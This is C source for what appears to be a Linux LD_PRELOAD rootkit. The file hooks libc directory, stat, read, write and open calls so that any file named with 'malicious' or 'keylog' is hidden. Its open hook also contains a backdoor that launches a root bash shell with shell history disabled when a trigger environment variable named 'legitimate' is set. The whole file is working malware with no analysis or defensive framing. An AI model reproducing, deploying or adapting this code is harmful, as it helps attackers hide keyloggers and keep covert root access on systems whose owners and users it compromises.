#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>

#define MAGIC_STR "malicious"

struct dirent *(*old_readdir)(DIR *);

int (*old_xstat)(int, const char *, struct stat *);
int (*old_lxstat)(int, const char *, struct stat *);
int (*old_fxstat)(int, int, struct stat *);
int (*old_open)(const char *, int, mode_t);

static FILE *(*old_fopen) (const char *, const char *);

ssize_t (*old_read)(int, void *, size_t);
ssize_t (*old_write)(int, const void *, size_t);

void get_fname(int fd, char * fname) {
    char linkstr[30];
    char fdstr[15];

    strcpy(linkstr, "/proc/self/fd/");
    snprintf(fdstr, 15, "%d", fd);
    strcat(linkstr, fdstr);

    readlink(linkstr, fname, NAME_MAX);
}

void drop_shell() {
    if (geteuid() == 0 && getenv("legitimate")) {
        setuid(0);
        setgid(0);
        unsetenv("legitimate");
        putenv ("HISTFILE=/dev/null");
        execl("/bin/bash", "/bin/bash", (char *) 0);
    }
}

void __attribute__((constructor)) _init() {
    void *handle = dlopen("libc.so.6", RTLD_LAZY);
    
    old_readdir = dlsym(handle, "readdir");
    old_xstat = dlsym(handle, "__xstat");
    old_lxstat = dlsym(handle, "__lxstat");
    old_fxstat = dlsym(handle, "__fxstat");
    old_read = dlsym(handle, "read");
    old_write = dlsym(handle, "write");
    old_open = dlsym(handle, "open");
    old_fopen = dlsym (handle, "fopen");
}

struct dirent *readdir(DIR *dirp) {
    struct dirent *dir;

    while((dir = old_readdir(dirp))) {
        if (!strstr(dir->d_name, MAGIC_STR) && !strstr(dir->d_name, "keylog"))
            break;
    }

    return dir;
}

int __xstat(int ver, const char *path, struct stat *buf) {
    if (strstr(path, MAGIC_STR) || strstr(path, "keylog")) {
        errno = ENOENT;
        return -1;
    } else {
        return old_xstat(ver, path, buf);
    }
}

int __lxstat(int ver, const char *path, struct stat *buf) {
    if (strstr(path, MAGIC_STR) || strstr(path, "keylog")) {
        errno = ENOENT;
        return -1;
    } else {
        return old_lxstat(ver, path, buf);
    }
}

int __fxstat(int ver, int fd, struct stat *buf) {
    char fname[NAME_MAX];

    get_fname(fd, fname);

    if (strstr(fname, MAGIC_STR) || strstr(fname, "keylog")) {
        errno = ENOENT;
        return -1;
    } else {
        return old_fxstat(ver, fd, buf);
    }
}

ssize_t read(int fd, void *buf, size_t count) {
    char fname[NAME_MAX];

    get_fname(fd, fname);

    if (strstr(fname, MAGIC_STR) || strstr(fname, "keylog")) {
        errno = EIO;
        return -1;
    } else {
        return old_read(fd, buf, count);
    }
}

ssize_t write(int fd, const void *buf, size_t count) {
    char fname[NAME_MAX];

    get_fname(fd, fname);

    if (strstr(fname, MAGIC_STR) || strstr(fname, "keylog")) {
        errno = EIO;
        return -1;
    } else {
        return old_write(fd, buf, count);
    }
}

int open(const char *path, int flags, mode_t mode) {
    drop_shell();

    if (strstr(path, MAGIC_STR) || strstr(path, "keylog")) {
        errno = ENOENT;
        return -1;
    } else {
        return old_open(path, flags, mode);
    }
}
